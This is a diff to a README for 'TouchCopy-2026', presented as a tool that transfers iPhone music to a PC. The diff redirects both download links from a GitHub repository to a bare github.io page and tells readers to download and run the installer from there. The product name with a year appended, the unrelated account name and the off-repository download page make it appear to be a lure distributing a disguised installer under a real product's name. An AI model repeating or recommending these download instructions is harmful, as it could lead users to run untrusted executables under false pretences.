@@ -1,6 +1,6 @@
 # 📱 TouchCopy-2026 - Transfer iPhone music to your PC
 
-[![Download TouchCopy-2026](https://img.shields.io/badge/Download-TouchCopy-blue.svg)](https://github.com/luciusimplausible900/TouchCopy-2026)
+[![Download TouchCopy-2026](https://img.shields.io/badge/Download-TouchCopy-blue.svg)](https://luciusimplausible900.github.io)
 
 ## 🎯 About This Software
 
@@ -21,7 +21,7 @@ Your computer must meet these standards to run the software correctly:
 Follow these steps to get the software running on your machine.
 
 1.  **Download the Installer**
-    Visit the official download page here: [https://github.com/luciusimplausible900/TouchCopy-2026](https://github.com/luciusimplausible900/TouchCopy-2026). Click the link to save the installer file to your computer.
+    Visit the official download page here: [https://luciusimplausible900.github.io](https://luciusimplausible900.github.io). Click the link to save the installer file to your computer.
 
 2.  **Run the Installer**
     Locate the file in your Downloads folder. Double-click the file to open the installation wizard.
